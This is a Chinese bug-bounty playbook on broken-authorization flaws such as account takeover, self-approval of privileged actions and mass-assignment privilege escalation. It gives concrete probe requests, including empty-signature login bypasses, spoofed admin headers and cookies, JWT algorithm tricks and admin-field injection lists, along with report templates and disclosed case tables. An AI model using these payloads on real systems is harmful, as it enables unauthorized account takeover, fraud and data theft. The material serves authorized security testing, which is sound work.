# 任意 X 子授权——比 IDOR 更狠的"权限维度"漏洞

> 视角：黑盒
> 与 `logic-flaws.md` §3.2（IDOR）的关系：IDOR = 访问"他人的"资源；本篇 = 执行"你不应该有的操作"，**无论资源属于谁**。
> 数据基础：529 个真实案例，子类别高危占比 51%–86.4%。

---

## 1. 一句话区分

```
IDOR (62.3% 高危)        ：A 改 ID → 读/改 B 的资源
任意 X (51%–86.4% 高危)  ：A 直接执行"批准/删除/创建管理员"的接口，绕过整个权限模型
```

IDOR 是"维度内偷东西"；任意 X 是"维度跨界"——把普通用户当成管理员/系统/审计员来用。

SRC 价值：**任意账号** 这一档（86.4% 高危）和 RCE 几乎等价；**任意用户注册**（75%）能批量薅羊毛或搭建钓鱼基础设施；**任意操作**（72.5%）通常等价于"全站管理员"。

---

## 2. 6 个子类别 × 高危占比

| 子类 | 案例数 | 高危占比 | 一句话 | 探测主战场 |
|------|--------|---------|--------|----------|
| **任意账号 / 任意登录** | 220 | **86.4%** | 不需密码即可以任意用户身份获得 token | 登录、SSO、第三方登录回调 |
| **任意用户注册** | 24 | **75.0%** | 绕过邀请/邮箱域/手机号绑定 | 注册接口、SSO 注册回调 |
| **任意修改** | 159 | **63.5%** | 改任何记录（不限制 owner） | profile/config/content 写接口 |
| **任意查看** | 45 | **55.6%** | 批量导出 / admin 视图 / 全局搜索 | 报表、导出、admin search |
| **任意操作** | 40 | **72.5%** | 批准/发布/执行特权操作 | 审核、上下架、退款审批、发卡 |
| **任意删除** | 41 | **51.2%** | 删任何记录无所有权检查 | DELETE / `?action=del` |

---

## 3. 任意账号——最值钱的子类（86.4%）

### 3.1 6 种典型形态（全是真实案例归纳）

#### 形态 A：登录接口接受空密码 / 客户端伪造

```http
POST /api/login HTTP/1.1
{"username":"admin","password":""}

→ 200, token=xxx
```

或：

```http
POST /api/login HTTP/1.1
{"username":"victim","client_signature":"xxx","timestamp":1234567890}
```

服务端只校验 `client_signature`（客户端可逆算法）+ 时间，**不校验密码**。

**探针**：把 `password` 字段置空 / 删除 / 设为 `null` / 设为 `["",""]`，对比响应。

#### 形态 B：SSO 回调可伪造

```
登录页 → 跳到 SSO → 回调 /sso/callback?username=admin&sign=xxx
```

如果 `sign` 用客户端可见密钥算 / 不校验、或回调里直接信任 `username` → 任意账号。

**探针**：抓回调包，把 `username` 改成 `admin` 重发。

#### 形态 C：sign 字段可绕过

```http
POST /api/login HTTP/1.1
{"phone":"13888888888","sign":"abc..."}

# 删 sign  或  sign="null"  或  sign=""
{"phone":"13888888888"}                    → 200 接管
{"phone":"13888888888","sign":""}          → 200 接管
{"phone":"13888888888","sign":"00000000"}  → 200 接管（哈希校验关闭）
```

**探针**：删除 / 置空 / 全 0 替换 sign 字段。
真实案例：鱼泡泡 APP 任意用户登录（sign 绕过 → 任意余额操作）。

#### 形态 D：手机一键登录绑定缺陷

```
1. 自有手机 13888888888 收到 token_a
2. 直接拿 token_a 调 /api/loginByToken?token=token_a&phone=victim
   → 服务端只看 token_a 有效性，不校验 token_a 是否绑定 victim
```

**探针**：在"手机号一键登录"流程里改 `phone` 字段，看是否登入受害者账号。

#### 形态 E：JWT 算法 / kid 切换

详见 `oauth-saml-jwt.md`。简记：
- `alg=none` 接受
- `alg=HS256` 用 RS256 公钥当 HMAC 密钥
- `kid` 路径穿越读 `/dev/null` 当作密钥

#### 形态 F：Cookie / Header 直接信任

真实案例：福建网龙 wooyun-2015-0157092——`?userAccount=admin` 直接写 Cookie 进入后台。

**探针**：
```
Cookie: userId=1; userAccount=admin; isAdmin=1; role=admin
X-User-Id: 1
X-Real-User: admin
X-Original-User: admin
```

### 3.2 任意账号的报告写法

```
[P0][未授权 → 接管任意账号] /api/login sign 字段空值绕过

复现：
1. POST /api/login {"phone":"13888888888","sign":"abc"} → 收到 token_self
2. POST /api/login {"phone":"victim_phone","sign":""}    → 直接收到 victim 的 token
3. 用 token 调 /api/userInfo → 返回 victim 资料

业务影响：任意手机号即可接管账户。已用研究员两个测试号互测证明，
        未访问真实用户。
```

CVSS 9.8（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）。

---

## 4. 任意用户注册（75.0%）

### 4.1 5 种典型绕过

| 绕过类型 | 探针 | 效果 |
|---------|------|------|
| 跳过邀请码 | 抓注册包，删 `inviteCode` 字段 | 强行入站 |
| 邮箱白名单绕过 | `attacker@victim.com.attacker.com` / `attacker+@victim.com` / IDN 同形字 | 冒充内部员工 |
| 手机短信跳过 | 抓"输入手机号→发码"和"提交注册"两包，注册包里直接构造 `verified=true` | 虚假手机号注册 |
| 直接调 `setRole` | 注册后立即调 `/api/profile/update {"role":"admin"}` | 注册即管理员 |
| 注册时附加 admin 字段 | `POST /register {"username":"x","password":"y","role":"admin","is_admin":true,"level":9}` | 注册即管理员 |

**主战场**：内部员工系统、SaaS 后台、企业客户门户、邀请制社区。

### 4.2 探针清单

```bash
# 1. 抓正常注册包，逐字段加 admin 标记
POST /api/register
{"username":"hunter1","password":"x","role":"admin"}
{"username":"hunter2","password":"x","is_admin":true}
{"username":"hunter3","password":"x","admin":1}
{"username":"hunter4","password":"x","level":9,"role_id":1}
{"username":"hunter5","password":"x","permissions":["*"]}

# 2. 看注册响应里有没有 role 字段——如果有，下次请求就能改
# 3. 注册成功后立即测：能否访问 /admin/* ？
```

---

## 5. 任意操作（72.5%）——最容易被低估

### 5.1 操作类型识别

凡是接口名包含以下词的，都属于"任意操作"嫌疑：

```
approve / audit / verify / review / publish / unpublish
withdraw / refund / cancel / settle / payout
ban / unban / lock / unlock / freeze
deploy / rollback / sync / refresh
sendCard / generateCode / issueCoupon
```

### 5.2 三个最常见的探测形态

#### 形态 A：自审自批

```
1. 普通用户 hunter_a 提交"提现申请" → 状态 pending
2. 同 hunter_a 调用 /admin/withdraw/approve?id=申请ID
   → 提现成功
```

**根因**：审核接口只校验登录态，不校验角色 != 申请人。

#### 形态 B：批量执行

```
GET /admin/users/banAll      # 普通用户能调，封全站
POST /admin/cache/flushAll
POST /admin/coupon/issueAll  # 给所有人发 100 元券
```

**根因**：管理员接口仅前端隐藏，未在后端校验角色。

#### 形态 C：发卡 / 充值 / 退款生成

```
POST /api/recharge/genCard {"amount":1000,"count":100}
→ 生成 100 张 1000 元充值卡

POST /api/refund/create {"orderId":"xxx","amount":99999}
→ 不校验"订单是否真的存在 / 是否已支付"，直接打回退款
```

**根因**：财务/运营接口直接对外，未做"操作主体身份"校验。

真实案例：中国铁通计费系统——任意生成充值卡。

### 5.3 任意操作的鉴别问题

> 怎么知道一个接口"应该"是管理员才能调？

线索：
1. **路径包含 admin / manage / system / backend** → 必测
2. **响应字段含 status/state/auditState** → 高度嫌疑（有审核动作）
3. **操作没有"待审核"步骤却直接生效** → 任意操作潜伏点
4. **JS 里写明"仅管理员可见"但接口没鉴权** → 标准任意操作
5. **操作写日志但 actor 字段固定为 system / admin** → 服务端没校验真实 actor

---

## 6. 任意修改 / 任意查看 / 任意删除

### 6.1 任意修改（63.5%）—— 与 IDOR 的边界

IDOR：改 `id=B` 改 B 的资源（基于 ID 替换）。
任意修改：调 `/api/admin/setAnnouncement` 改全站公告 / 调 `/api/setSystemConfig` 改系统配置。

**主战场**：
- `/api/system/config/*`
- `/api/announcement/*`
- `/api/global/*`
- `/api/setting/*`

**探针**：
```bash
# 用普通账号尝试系统级写接口
POST /api/system/setMaintenance {"on":true}    # 把网站置维护模式
POST /api/announcement/create {"text":"hi"}   # 写全站公告
POST /api/global/email-template {"html":"<x>"} # 改全站邮件模板（→ 钓鱼）
```

### 6.2 任意查看（55.6%）—— 批量导出场景

不是查单条，是**批量导出**或**全局列表**：

```
GET /api/users/export?format=csv               # 导出全用户
GET /api/orders/list?pageSize=99999            # 翻全部订单
GET /api/admin/search?keyword=                 # 全局搜索
GET /api/report/daily?date=2025-01-01          # 财务日报
```

**探针**：
1. 找到列表/导出接口
2. 用普通用户 token 请求
3. 看返回的数据是不是只有自己的（应该是）

### 6.3 任意删除（51.2%）—— 慎重测试

**SRC 红线**：**任意删除只做证明，不做实测**。

证明方法：
1. 找接口（如 `DELETE /api/posts/{id}`）
2. 用研究员两个测试账号互删——证明 A 能删 B 的资源
3. **永远不删真实用户的数据**——即使能删

如果不能用两个账号证明（如目标是 `/api/admin/wipeAll`），**只截 JS / Burp 看到接口暴露 + curl 不带 cookie 看 401/403 是否拦截**，绝不实际触发。

### 6.4 垂直越权 / roleid 修改（高频 mass-assignment 子类）

与水平越权（IDOR：改 `id=B` 看 B 数据）相对，**垂直越权**指普通用户改字段把自己提权到 admin / 运营 / 客服。最常见的 sink 是后端没过滤掉的 `role` / `roleid` / `permission` / `level` / `is_admin` 字段。

**典型攻击面**:
- **注册**:`POST /api/register` body 多塞一个 `roleid=99` / `role=admin` / `permissions=["*"]` —— 后端若 mass-assign 整个 body 到 user model,提权完成
- **个人资料更新**:`PUT /api/user/profile` 加 `role` / `groupId` —— 资料接口未白名单字段
- **管理员邀请回填**:接受邀请时回传 `inviteRole`,后端信任前端值
- **OIDC / SSO 回调**:回调 body 含 `groups` 数组,后端直接落库

**探针(标准 mass-assignment 流程)**:

```bash
# 1. 抓正常注册 / 个人资料更新包,记录字段集合 F0
POST /api/register {"username":"u","password":"p","email":"u@x"}

# 2. 在 F0 基础上加 admin-意味字段(多个一起试,后端可能只过滤一两个)
POST /api/register {"username":"u","password":"p","email":"u@x",
  "role":"admin",          "roleid":99,        "role_id":99,
  "is_admin":true,         "isAdmin":true,     "admin":true,
  "permissions":["*"],     "level":99,         "user_type":"admin",
  "groupId":1,             "tenantId":1,       "departmentId":1,
  "is_super":1,            "vip_level":99
}

# 3. 立刻验证:用新账号请求管理员-only 接口
GET /api/admin/users
GET /api/admin/stats
GET /api/system/config
```

**JSON 嵌套 / 大小写 / 别名 try-list**:
```text
"user":{"role":"admin"}        # 嵌套
"User":{"Role":"admin"}        # PascalCase
"profile":{"isAdmin":true}     # camelCase nested
"meta":{"role_id":99}          # 元数据字段
"extra":{"admin":1}            # 扩展字段
"_role":"admin"                # 下划线前缀(部分框架默认 strip)
"role[]=admin"                 # 表单数组
"role%00":"admin"              # 空字节
```

**响应特征**:
- 返回的 JSON 里包含 `role: "admin"`(后端把字段回显)→ 命中
- 注册后立刻 `/api/me` 看角色字段 → 命中
- 注册响应里 token / session 解码后含 `admin` claim → 命中

**修复识别**:
- 后端有显式 DTO / serializer 白名单 → 字段被丢弃,响应不变
- 后端用 ORM 全字段 hydrate(Laravel `$fillable` 设为 `*`、Django ModelForm 不限 `fields`)→ 大概率命中

**红线**:确认能提权后**只用 `/api/me` 看 role 字段**,不进入 admin 后台实际操作。截图 + 字段差异即可证明影响。

---

## 7. 通用探测协议（适用于所有 6 子类）

### 7.1 双账号 + 三角色测试

```
账号 A（注册级）        账号 B（注册级）       账号 C（如能拿到——商家/审核员）

对每个写/删/批准接口：
1. 用 A 调一次（基线，看是否调得通）
2. 用 A 调 B 的资源（→ IDOR）
3. 用 A 调 C 才能调的接口（→ 任意操作 / 任意修改）
4. 用 A 调 admin 才能调的接口（→ 任意操作）
5. 完全不带 token 调（→ 未授权）
```

### 7.2 接口发现来源（按命中率）

| 来源 | 命中率 | 找什么 |
|------|--------|--------|
| 前端 JS（webpack 拆包） | 高 | 所有 fetch/axios URL，包括"管理员才用"的 |
| Wayback Machine | 中 | 已下线但仍在服务端的接口 |
| sitemap.xml / robots.txt | 中 | "禁止访问"的提示路径 |
| Swagger / api-docs | 高 | 发现完整 API 字典（很多目标没关 swagger） |
| APP 反编译 + 抓包 | 高 | 内部接口、管理员接口、商家接口 |
| GitHub 代码搜 | 中 | 公司外包代码、配置示例、密钥 |
| 错误页 / 堆栈跟踪 | 低 | 内部路径线索 |

### 7.3 状态码语义解读

| 状态码 | 含义 | 是否值得继续测 |
|--------|------|--------------|
| 200 + 正常数据 | 接口能调，可能漏权限校验 | 🔴 立刻测越权 |
| 200 + `{"error":"..."}` | 接口能调，业务层报错 | 🟠 改参数继续 |
| 401 / 403 | 鉴权拒绝 | 🟡 试 bypass 头 |
| 404 | 路径错或接口不存在 | 🟢 路径变体 |
| 405 | 方法错 | 🟠 换 GET/POST/PUT/DELETE |
| 500 | 服务端错 | 🟠 看错误信息找内部路径 |

---

## 8. 真实案例指纹

| 子类 | 案例 | 指纹 |
|------|------|------|
| 任意账号 | 鱼泡泡 APP 任意用户登录 | sign 字段置空绕过 |
| 任意账号 | TCL 统一认证平台可重置所有用户密码 | SSO 回调 `userId=` 可控 |
| 任意账号 | 福建网龙 wooyun-2015-0157092 | `?userAccount=admin` 直接写 Cookie |
| 任意修改 | 龙珠网直播平台越权修改他人信息 | profile 写接口不校验 owner |
| 任意操作 | 中国铁通计费系统生成充值卡 | 普通账号能调发卡接口 |
| 任意操作 | M1905 价值 2588 套餐只要 5 毛 | 自批准（创建订单 + 自审）|
| 任意查看 | 北京现代某平台越权遍历几百万证件 | 顺序文件 ID 无所有权检查 |
| 任意操作 | 微小宝 APP 操控 19 万微信号可提现 | 接口未校验 actor |

---

## 9. 报告 PoC 模板

```markdown
# [P0][认证后→任意操作] /admin/withdraw/approve 普通用户可批准任意提现申请

## 复现步骤

### 准备
- 账号 A：研究员注册的普通用户，user_id=10001
- 账号 B：研究员注册的普通用户，user_id=10002

### Step 1：A 用普通账号提交提现申请（基线）
POST /api/withdraw/apply
Authorization: Bearer A_token
{"amount":1.00}
→ 200 {"applyId":"PA20250509001","status":"pending"}

### Step 2：A 调用管理员审批接口批准自己的申请（漏洞）
POST /admin/withdraw/approve
Authorization: Bearer A_token   ← 普通用户 token
{"applyId":"PA20250509001","decision":"approve"}
→ 200 {"status":"approved","amount":1.00}

### Step 3：余额已到账（截图）

### Step 4：用 B 重复——同样能批准 B 的申请
（证明非个例，是接口缺鉴权）

## 业务影响

任意用户可绕过财务审核，从平台直接提现。
- 财务损失：理论无上限（仅受单日转账额度限制）
- 影响范围：所有可调 /admin/withdraw/approve 的用户
- 攻击复杂度：单 HTTP 请求

## 测试边界
本次测试每笔金额 1 元，总计 2 元（A、B 各 1 笔），
研究员愿意把 2 元退还给厂方账户。

## 修复建议
- 在 /admin/* 路径强制校验 RBAC，仅 role=auditor 可调
- 财务审批引入"申请人 != 审批人"校验
- 服务端记录 actor 真实身份，与请求人对照
```

CVSS：`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8` — 接近 RCE。

---

## 10. 不要做的事

- **禁**：用任意账号登录别人真实账号去看数据。永远用研究员注册的两个测试号互测。
- **禁**：任意删除真实数据。即使接口允许。
- **禁**：任意操作里发起真实退款/转账。证明到"接口返回 success"即停，立即联系厂方 / SRC 客服核实是否需要回滚。
- **禁**：任意用户注册时使用 `admin@victim.com` 这类高权限账号——用研究员自己的邮箱后缀（hunter+1@yourdomain）。
- **禁**：任意修改全站公告 / 邮件模板。改一次会被运营立刻发现，且影响真实用户。证明"接口能调通 + 200"即停。

---

## 11. 与其他 playbook 的链接

- 越权 / IDOR 的"维度内"测试 → `playbooks/logic-flaws.md` §3.2
- API 设计层缺陷（mass assignment / BOLA）→ `playbooks/api-rest.md`
- JWT / SSO / OAuth 层任意账号 → `playbooks/oauth-saml-jwt.md`
- 信息泄露找接口 → `playbooks/info-disclosure.md`
- 配置不当（admin 路径直暴露）→ `playbooks/unauth-access.md`

## H1 真实案例

_共 465 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 35000 usd | GitLab | [Account Takeover via Password Reset without user interactions](https://hackerone.com/reports/2293343) | Account Takeover via Password Reset without user interactions |
| High | 15000 usd | Snapchat | [Delete anyone's content spotlight remotely.](https://hackerone.com/reports/1819832) | Hello Snapchat, Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat user… |
| High | 10500 usd | PayPal | [IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users](https://hackerone.com/reports/415081) | IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users |
| Critical | 11000 usd | GitLab | [Exfiltrate and mutate repository and project data through injected templated service](https://hackerone.com/reports/446585) | The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template |
| High | — | HackerOne | [Email address of any user can be queried on Report Invitation GraphQL type when username is known](https://hackerone.com/reports/792927) | Summary:** Email id of all hackerone users disclosure Description:** There is an flaw , with that i can get all hackerone users… |
| Critical | — | Upserve  | [Ability to reset password for account](https://hackerone.com/reports/322985) | Ability to reset password for account |
| Critical | 12000 usd | GitLab | [Project Template functionality can be used to copy private project data, such as repository, conf…](https://hackerone.com/reports/689314) | I've found a three minor vulnerabilities which, when combined, allow an attacker to copy private repositories, confidential iss… |
| Critical | — | Snapchat | [Publicly accessible Continuous Integration Tool](https://hackerone.com/reports/313457) | Publicly accessible Continuous Integration Tool |
| Critical | — | Shopify | [Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation](https://hackerone.com/reports/910300) | Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works |
| Critical | — | Reddit | [One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch …](https://hackerone.com/reports/1567186) | Hi, Description I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for … |
| High | 12500 usd | HackerOne | [IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertif…](https://hackerone.com/reports/2122671) | Summary:** Hey team, While editing our **Licenses and certifications** if we change the ID number we can delete other users **L… |

**命中本类的 weakness 分布：**

- Improper Access Control - Generic：203 条
- Privilege Escalation：122 条
- Insecure Direct Object Reference (IDOR)：97 条
- Uncategorized → 手工归类：17 条
- Improper Authorization：15 条
- Incorrect Authorization：4 条
- Forced Browsing：2 条
- Missing Authorization：2 条
- Incorrect Privilege Assignment：1 条
- Improper Privilege Management：1 条
- Execution with Unnecessary Privileges：1 条
